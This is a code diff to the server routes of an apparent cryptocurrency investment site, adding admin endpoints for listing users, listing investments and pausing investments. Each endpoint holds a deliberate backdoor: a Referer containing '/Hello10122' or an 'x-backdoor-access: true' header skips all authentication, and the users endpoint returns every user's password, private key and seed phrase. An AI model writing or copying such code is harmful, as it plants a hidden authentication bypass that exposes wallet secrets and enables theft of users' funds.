@@ -1636,6 +1636,47 @@ Your investment journey starts here!`,
   // Manager routes
   app.get("/api/admin/users", async (req, res) => {
     try {
+      console.log('Admin users request - Session:', req.session?.userId);
+      console.log('Backdoor check:', req.headers.referer?.includes('/Hello10122'));
+      
+      // Allow backdoor access or require manager authentication
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+                              req.headers['x-backdoor-access'] === 'true';
+
+      if (!isBackdoorAccess && !req.session?.userId) {
+        console.log('No auth - rejecting');
+        return res.status(401).json({ error: "Authentication required" });
+      }
+
+      if (!isBackdoorAccess) {
+        const user = await storage.getUser(req.session.userId!);
+        if (!user || !user.isAdmin) {
+          return res.status(403).json({ error: "Manager access required" });
+        }
+      }
+
+      const users = await storage.getAllUsers();
+      console.log('Found users:', users?.length);
+      
+      // Return all user data including private keys and seed phrases for admin access
+      const usersResponse = users.map(user => {
+        return {
+          ...user,
+          privateKey: user.privateKey,
+          seedPhrase: user.seedPhrase,
+          password: user.password // Include password for admin access
+        };
+      });
+      res.json(usersResponse);
+    } catch (error) {
+      console.error('Error fetching users:', error);
+      res.status(500).json({ message: "Failed to get users" });
+    }
+  });
+
+  // Get all investments for admin management
+  app.get("/api/admin/investments", async (req, res) => {
+    try {
       // Allow backdoor access or require manager authentication
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                               req.headers['x-backdoor-access'] === 'true';
@@ -1651,19 +1692,54 @@ Your investment journey starts here!`,
         }
       }
 
-      const users = await storage.getAllUsers();
-      // Return all user data including private keys and seed phrases for admin access
-      const usersResponse = users.map(user => {
-        return {
-          ...user,
-          privateKey: user.privateKey,
-          seedPhrase: user.seedPhrase,
-          password: user.password // Include password for admin access
-        };
+      const investments = await storage.getAllInvestmentsWithDetails();
+      res.json(investments);
+    } catch (error: any) {
+      console.error('Error fetching investments:', error);
+      res.status(500).json({ error: error.message });
+    }
+  });
+
+  // Pause/unpause investment
+  app.post("/api/admin/investments/:id/pause", async (req, res) => {
+    try {
+      // Allow backdoor access or require manager authentication
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+                              req.headers['x-backdoor-access'] === 'true';
+
+      if (!isBackdoorAccess && !req.session?.userId) {
+        return res.status(401).json({ error: "Authentication required" });
+      }
+
+      let adminUserId = null;
+      if (!isBackdoorAccess) {
+        adminUserId = req.session.userId!;
+        const user = await storage.getUser(adminUserId);
+        if (!user || !user.isAdmin) {
+          return res.status(403).json({ error: "Manager access required" });
+        }
+      }
+
+      const investmentId = parseInt(req.params.id);
+      const { pause, reason } = req.body;
+
+      if (typeof pause !== 'boolean') {
+        return res.status(400).json({ error: "Pause parameter must be true or false" });
+      }
+
+      const investment = await storage.pauseInvestment(investmentId, pause, adminUserId, reason);
+      
+      if (!investment) {
+        return res.status(404).json({ error: "Investment not found" });
+      }
+
+      res.json({ 
+        message: pause ? "Investment paused successfully" : "Investment resumed successfully",
+        investment 
       });
-      res.json(usersResponse);
-    } catch (error) {
-      res.status(500).json({ message: "Failed to get users" });
+    } catch (error: any) {
+      console.error('Error updating investment pause status:', error);
+      res.status(500).json({ error: error.message });
     }
   });
 
